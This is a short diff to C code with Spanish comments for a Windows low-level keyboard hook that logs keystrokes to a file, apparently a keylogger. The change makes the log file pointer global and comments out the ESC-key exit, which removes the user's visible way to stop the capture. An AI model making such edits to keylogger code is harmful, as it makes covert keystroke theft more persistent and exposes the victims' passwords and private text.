@@ -2,7 +2,7 @@
 
 // Variable global para el hook
 static HHOOK g_hHook = NULL;
-static FILE* logFile = NULL;
+FILE* logFile = NULL;
 
 // Funcion para crear/abrir archivo de log
 BOOL CreateLogFile(void)
@@ -100,9 +100,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(
         }
 
         // Si presiona ESC, termina el programa
-        if (vkCode == VK_ESCAPE) {
+        /* if (vkCode == VK_ESCAPE) {
             PostQuitMessage(0);
-        }
+        } */
     }
     return CallNextHookEx(g_hHook, nCode, wParam, lParam);
 }
